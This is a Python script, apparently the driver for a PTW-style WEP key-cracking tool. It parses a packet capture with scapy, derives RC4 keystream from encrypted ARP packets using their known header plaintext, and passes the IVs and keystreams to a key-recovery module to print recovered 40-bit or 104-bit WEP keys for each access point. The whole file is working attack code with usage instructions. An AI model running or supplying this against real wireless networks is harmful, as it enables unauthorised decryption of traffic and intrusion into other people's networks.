from scapy.all import *
from HelperClass import *
import KeyCompute
import Constants as const
import sys

def GetKeystream(cipherbytes, plainbytes):
    # only get keystream of known header plaintext
    n = len(plainbytes)
    int_var = int.from_bytes(cipherbytes[:n], sys.byteorder)
    int_key = int.from_bytes(plainbytes, sys.byteorder)

    int_enc = int_var ^ int_key

    return bytearray.fromhex(bytes.hex(int_enc.to_bytes(n, sys.byteorder)))


def printkey(key, keylen: int):
    print("Found key with " + str(keylen * 8) + "-bit length")
    for i in range(keylen):
        key[i] = hex(key[i])
    print(key[:keylen])


def isvalidpkt(pkt):
    return ((len(pkt[0]) == 86 or len(pkt[0]) == 68) and bytes(pkt[0])[0] == 8)


def main():
    if len(sys.argv) < 2 or len(sys.argv)>2:
        print("Bad argument. Usage: python ptw.py <capturefile>")
        return

    cap_path = sys.argv[1]

    print("Processing packets, could take a while")
    try:
        pcap = rdpcap(cap_path)
    except scapy.error.Scapy_Exception:
        print("Error. PCAP file could not be read")
        return
    except FileNotFoundError:
        print("File not found. Please check your file again")
        return

    numstates = 0
    try:
        for pkt in pcap:
            if isvalidpkt(pkt):
                # Packet is ARP
                currenttable = -1
                for k in range(len(networktable)):
                    if networktable[k].bssid == pkt[0].addr2 and networktable[k].keyid == pkt[1].keyid:
                        currenttable = k

                if currenttable == -1:
                    # Allocate new table
                    print("Allocating a new table")
                    print("bssid = " + str(pkt[0].addr2) + " keyindex=" + str(pkt[1].keyid))
                    numstates += 1
                    networktable.append(network())
                    networktable[numstates-1].state = KeyCompute.newattackstate()
                    networktable[numstates-1].bssid = pkt[0].addr2
                    networktable[numstates-1].keyid = pkt[1].keyid
                    currenttable = numstates - 1

                iv = pkt[1].iv
                # Get known plaintext
                arp_known = const.ARP_HEADER
                if pkt[0].addr1 == const.BROADCAST_MAC or pkt[0].addr3 == const.BROADCAST_MAC:
                    arp_known += const.ARP_REQUEST
                else:
                    arp_known += const.ARP_RESPONSE

                keystream = GetKeystream(pkt[1].wepdata, arp_known)
                KeyCompute.addsession(networktable[currenttable].state, iv, keystream)

        print("Analyzing packets")
        for k in range(len(networktable)):
            print("bssid = " + str(networktable[k].bssid) + " keyindex=" + str(networktable[k].keyid) + " packets="+str(networktable[k].state.packets_collected))
            print("Checking for 40-bit key")
            if KeyCompute.computekey(networktable[k].state, key, 5, const.KEYLIMIT / 10) == 1:
                printkey(key, 5)
                return
            print("Checking for 104-bit key")
            if KeyCompute.computekey(networktable[k].state, key, 13, const.KEYLIMIT) == 1:
                printkey(key, 13)
                return

            print("Key not found")
            return

    except Exception as e:
        print(e)


networktable = []
key = [None] * const.MAINKEYBYTES

if __name__ == "__main__":
    main()




